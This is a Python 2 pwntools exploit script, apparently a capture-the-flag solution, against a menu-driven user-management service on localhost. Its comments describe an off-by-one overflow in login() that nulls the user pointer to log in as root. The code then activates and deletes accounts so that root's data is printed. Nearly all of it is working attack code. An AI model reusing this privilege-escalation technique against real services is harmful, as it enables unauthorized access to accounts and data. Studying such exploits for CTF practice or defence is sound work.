#!/usr/bin/env python2
from pwn import *


# Program parameters

PASS_MAX = 24
MAX_LEN = 1024

# Helper functions

def create_user(p, username, password):
    p.recvuntil('> ')
    p.sendline('1')

    p.recvuntil('Enter username : ')
    p.sendline(username)

    p.recvuntil('Enter password : ')
    p.sendline(password)

    assert 'User created' in p.recvline()


def login(p, username, password):
    p.recvuntil('> ')
    p.sendline('2')

    p.recvuntil('Username : ')
    p.send(username)

    p.recvuntil('Password : ')
    p.send(password)

    assert 'Success login with' in p.recvline()


def activate(p, username):
    p.recvuntil('> ')
    p.sendline('3')

    p.recvuntil('Enter username to modify : ')
    p.sendline(username)

    p.recvuntil('> ')
    p.sendline('3')


def remove_user(p, username):
    p.recvuntil('> ')
    p.sendline('4')

    p.recvuntil('Enter username to delete : ')
    p.sendline(username)


# Start process

p = remote('localhost', 5555)

# Vulnerability in login()
# The local variables `buff` and `passwd_to_verify` have a size of MAX_LEN,
# but get_input can write up to MAX_LEN+1 bytes
#
# We can use the `get_input(buff, "Password : ")` to write 0 in `user`
# Then, strncmp only checks the first PASS_MAX characters, so we just
# use a password of 'A' * PASS_MAX

create_user(p, 'maxima', 'A' * PASS_MAX)
login(p, 'maxima\n', 'A' * MAX_LEN)

# Now we are logged in as root

# We would like to call show_data on the root account
# We need to make menu() think that the root account is not admin, but is active

# Activate maxima's account
activate(p, 'maxima')

# Now maxima's account has is_admin = 0 and is_active = 1

# If we remote root, users[0] will point on maxima, and we will be able to
# call show_data(user) with user = root
remove_user(p, 'root')

# Now call `show my data`
p.recvuntil('> ')
p.sendline('3')
p.recvline()
p.recvline()
p.recvline()
print(p.recvline())
